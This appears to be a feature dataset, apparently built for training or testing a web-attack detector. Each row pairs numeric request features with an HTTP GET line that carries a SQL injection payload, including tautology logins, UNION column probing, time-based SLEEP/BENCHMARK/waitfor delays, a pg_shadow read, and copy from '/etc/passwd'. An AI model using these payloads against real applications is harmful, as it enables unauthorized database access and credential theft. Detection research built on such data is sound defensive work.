61,1,200,3228,30,4,15,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2--  HTTP/1.1
43,1,200,3330,7,15,6,2,1,GET ?username=admin") or "1"="1"/* HTTP/1.1
43,1,200,2949,7,15,6,2,1,GET ?username=admin") or "1"="1"/* HTTP/1.1
92,2,200,4409,21,32,13,2,1,GET ?code=' and substring(password/text()_1_1)='7&code= UNION ALL SELECT 1_2_3_4_5# HTTP/1.1
30,1,200,6591,14,2,3,1,1,GET ?id= ORDER BY 20  HTTP/1.1
30,1,200,6522,14,2,3,1,1,GET ?id= ORDER BY 20  HTTP/1.1
67,1,200,7251,7,45,5,1,1,GET ?password=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,3001,7,45,5,1,1,GET ?password=select current server from sysibm.sysdummy1; HTTP/1.1
191,1,200,7051,129,2,17,1,1,GET ?id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
191,1,200,2150,129,2,17,1,1,GET ?id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
191,1,200,5511,129,2,17,1,1,GET ?id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
26,1,200,6418,7,6,4,1,1,GET ?pass= or 1=1 HTTP/1.1
26,1,200,3769,7,6,4,1,1,GET ?pass= or 1=1 HTTP/1.1
132,2,200,5601,21,19,10,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26#&phone=1 or pg_sleep(5)-- HTTP/1.1
64,1,200,1191,21,8,5,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10--  HTTP/1.1
103,2,200,1169,38,4,16,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11&id=1' ORDER BY 3--  HTTP/1.1
94,1,200,7871,21,2,3,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23 HTTP/1.1
94,1,200,3267,21,2,3,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23 HTTP/1.1
94,1,200,6431,21,2,3,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23 HTTP/1.1
82,1,200,2315,31,4,11,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10 HTTP/1.1
112,2,200,7621,31,14,16,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14-- &pass=admin" # HTTP/1.1
162,2,200,2398,44,9,15,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11 HTTP/1.1
139,2,200,3460,30,16,19,1,1,GET ?name=admin' or 1=1--&phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24 HTTP/1.1
72,2,200,5110,14,24,14,1,1,GET ?username= ORDER BY 31337 &pass="));waitfor delay '0:0:5'-- HTTP/1.1
33,1,200,2465,14,5,3,1,1,GET ?email= ORDER BY 23  HTTP/1.1
126,2,200,3766,28,7,8,1,1,GET ?name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26#&tel= ORDER BY 11--  HTTP/1.1
64,2,200,7516,14,19,12,1,1,GET ?name=waitfor delay '00:00:05'#&tel= ORDER BY 12--  HTTP/1.1
36,1,200,1080,7,11,5,1,1,GET ?user=admin") or "1"="1 HTTP/1.1
36,1,200,7271,7,11,5,1,1,GET ?user=admin") or "1"="1 HTTP/1.1
67,2,200,1964,7,23,22,1,1,GET ?username=")) or (("x"))=(("x&pass=admin' or '1'='1'-- HTTP/1.1
112,2,200,2957,29,9,10,1,1,GET ?name= WHERE 1=1 AND 1=1--&phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
110,1,200,4400,31,8,13,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17--  HTTP/1.1
35,1,200,6780,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
141,2,200,2129,21,18,17,1,1,GET ?account=admin') or ('1'='1'--&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27--  HTTP/1.1
31,1,200,4835,7,13,5,1,1,GET ?username=admin' # HTTP/1.1
33,1,200,7160,14,4,4,1,1,GET ?code= ORDER BY 25#  HTTP/1.1
46,2,200,3487,12,15,10,1,1,GET ?code=admin' #&code=or SLEEP(5)=" HTTP/1.1
68,1,200,1997,21,5,4,1,1,GET ?phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13# HTTP/1.1
29,1,200,5634,9,4,6,1,1,GET ?user= OR 1=0--  HTTP/1.1
29,1,200,3026,9,4,6,1,1,GET ?user= OR 1=0--  HTTP/1.1
134,2,200,6113,37,8,19,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22-- &code= ORDER BY 2--  HTTP/1.1
92,2,200,6364,44,10,20,1,1,GET ?phone=-1 UNION SELECT 1 INTO @_@_@&id=(SELECT * FROM (SELECT(SLEEP(5)))ecMj)-- HTTP/1.1
73,1,200,2368,30,4,15,1,1,GET ?pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8--  HTTP/1.1
135,2,200,3437,35,6,7,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15-- &pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16 HTTP/1.1
123,2,200,2549,21,8,9,1,1,GET ?code=' '&code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
181,2,200,2775,46,24,19,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28&pass=select * from pg_shadow; HTTP/1.1
64,1,200,4850,8,32,12,1,1,GET ?account= and (select substring(@@version_1_1))='X' HTTP/1.1
64,1,200,5029,8,32,12,1,1,GET ?account= and (select substring(@@version_1_1))='X' HTTP/1.1
64,1,200,5334,8,32,12,1,1,GET ?account= and (select substring(@@version_1_1))='X' HTTP/1.1
167,2,200,7179,46,14,21,2,1,GET ?phone=admin") or "1"="1"/*&id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24# HTTP/1.1
31,1,200,6746,7,10,7,1,1,GET ?code=') or true-- HTTP/1.1
31,1,200,5114,7,10,7,1,1,GET ?code=') or true-- HTTP/1.1
29,1,200,4548,7,9,6,2,1,GET login/?id='="or' HTTP/1.1
63,2,200,3124,7,29,12,3,1,GET ?id=copy myfile from '/etc/passwd'; &id=' or 1=1-- HTTP/1.1
35,1,200,7397,14,5,5,1,1,GET ?email= ORDER BY 21--  HTTP/1.1
98,2,200,4868,31,7,17,1,1,GET ?tel= '-'&name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12# HTTP/1.1
48,1,200,3498,7,20,11,1,1,GET ?username=';waitfor delay '0:0:5'-- HTTP/1.1
38,1,200,3610,14,8,5,1,1,GET ?password= ORDER BY 26--  HTTP/1.1
31,1,200,4900,13,4,5,1,1,GET ?pass= HAVING 1=0# HTTP/1.1
54,1,200,3748,30,5,7,1,1,GET ?phone= UNION SELECT @@VERSION_SLEEP(5)_3 HTTP/1.1
54,1,200,5754,30,5,7,1,1,GET ?phone= UNION SELECT @@VERSION_SLEEP(5)_3 HTTP/1.1
54,1,200,3435,30,5,7,1,1,GET ?phone= UNION SELECT @@VERSION_SLEEP(5)_3 HTTP/1.1
59,2,200,5585,15,11,15,2,1,GET ?email=' or '1'='1'/*&pass= WHERE 1=1 AND 1=0# HTTP/1.1
131,2,200,7960,60,8,20,1,1,GET ?code= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7#&code= UNION ALL SELECT 1_2_3_4_5_6--  HTTP/1.1
34,1,200,2051,14,4,5,1,1,GET ?mail= ORDER BY 23--  HTTP/1.1
41,1,200,6034,7,14,5,2,1,GET ?account=admin" or "1"="1"/* HTTP/1.1
49,1,200,6431,22,7,6,2,1,GET login/?id=-1 UNION SELECT 1 INTO @_@ HTTP/1.1
57,2,200,1603,7,17,15,1,1,GET ?id="or 1=1 or ""="&pass=admin') or '1'='1'# HTTP/1.1
63,2,200,5296,21,14,10,1,1,GET ?name= UNION ALL SELECT 1_2_3#&tel=admin' or 1=1-- HTTP/1.1
96,1,200,1117,31,8,12,1,1,GET ?password= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13# HTTP/1.1
96,1,200,6006,31,8,12,1,1,GET ?password= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13# HTTP/1.1
142,2,200,2458,69,6,26,1,1,GET ?id= ORDER BY 24 &pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88)))--  HTTP/1.1
108,2,200,4810,46,9,26,1,1,GET ?phone=') or '1'='1'#&id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5# HTTP/1.1
22,1,200,3632,7,4,4,1,1,GET ?code="^" HTTP/1.1
22,1,200,1091,7,4,4,1,1,GET ?code="^" HTTP/1.1
22,1,200,5626,7,4,4,1,1,GET ?code="^" HTTP/1.1
22,1,200,4862,7,4,4,1,1,GET ?code="^" HTTP/1.1
106,1,200,3092,21,4,4,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26# HTTP/1.1
106,1,200,4228,21,4,4,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26# HTTP/1.1
95,2,200,2128,38,8,14,1,1,GET ?code= ORDER BY 10# &code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7 HTTP/1.1
63,2,200,6140,18,7,12,1,1,GET ?phone=SLEEP(5)--&id= AND 1083=1083 AND (1427=1427 HTTP/1.1
52,1,200,3922,13,8,6,1,1,GET ?username= AND 1083=1083 AND (1427=1427 HTTP/1.1
77,2,200,3916,34,10,12,1,1,GET ?code=" or "1"="1&code= UNION SELECT @@VERSION_SLEEP(5)_USER()_4 HTTP/1.1
52,2,200,7508,21,7,7,1,1,GET ?name= ORDER BY 28-- &tel= ORDER BY 16  HTTP/1.1
113,2,200,6770,21,10,15,2,1,GET ?mail=') or ('1'='1'/*&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21# HTTP/1.1
34,1,200,4654,7,12,8,1,1,GET ?user=' or 'one'='one HTTP/1.1
30,1,200,3604,14,2,3,1,1,GET ?id= ORDER BY 18  HTTP/1.1
30,1,200,1903,14,2,3,1,1,GET ?id= ORDER BY 18  HTTP/1.1
110,2,200,5400,40,16,21,2,1,GET ?name=OR 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(500000000/2))))&tel=benchmark(10000000_MD5(1))# HTTP/1.1
158,2,200,2452,36,12,15,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29&phone=pg_SLEEP(5) HTTP/1.1
34,1,200,5066,7,11,6,2,1,GET ?user=admin' or 1=1/* HTTP/1.1
72,2,200,6828,34,6,12,1,1,GET ?id=" or "" "&id= UNION SELECT @@VERSION_SLEEP(5)_USER()_4# HTTP/1.1
54,2,200,3944,19,11,12,1,1,GET ?code=ORDER BY SLEEP(5)--&code=' and 1='1 HTTP/1.1
60,1,200,6327,30,4,13,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3 HTTP/1.1
137,2,200,4707,28,9,10,1,1,GET ?name=1' GROUP BY 1_2_-- &phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27--  HTTP/1.1
69,2,200,5003,16,18,11,1,1,GET ?name=1 or benchmark(10000000_MD5(1))#&tel= ORDER BY 7#  HTTP/1.1
163,2,200,6523,74,10,31,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80)))#&phone=" " HTTP/1.1
33,1,200,1943,14,5,3,1,1,GET ?email= ORDER BY 21  HTTP/1.1
171,2,200,3748,46,14,20,1,1,GET ?username=or 1=1#&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28# HTTP/1.1
107,2,200,5266,38,27,17,2,1,GET ?email=select current_user;&phone=OR 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(1000000000/2)))) HTTP/1.1
53,1,200,1938,9,15,10,1,1,GET ?code=")) or benchmark(10000000_MD5(1))# HTTP/1.1
121,2,200,4699,33,10,18,1,1,GET ?email= AND 1=1&phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19--  HTTP/1.1
46,1,200,5214,19,4,7,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_3_4--  HTTP/1.1
46,1,200,4328,19,4,7,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_3_4--  HTTP/1.1
56,2,200,6743,12,16,11,2,1,GET ?name=or SLEEP(5)--&tel=admin" or "1"="1"/* HTTP/1.1
32,1,200,3069,7,10,8,1,1,GET ?username=' or ''=' HTTP/1.1
32,1,200,1449,7,10,8,1,1,GET ?username=' or ''=' HTTP/1.1
116,1,200,3926,31,8,13,1,1,GET ?password= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19--  HTTP/1.1
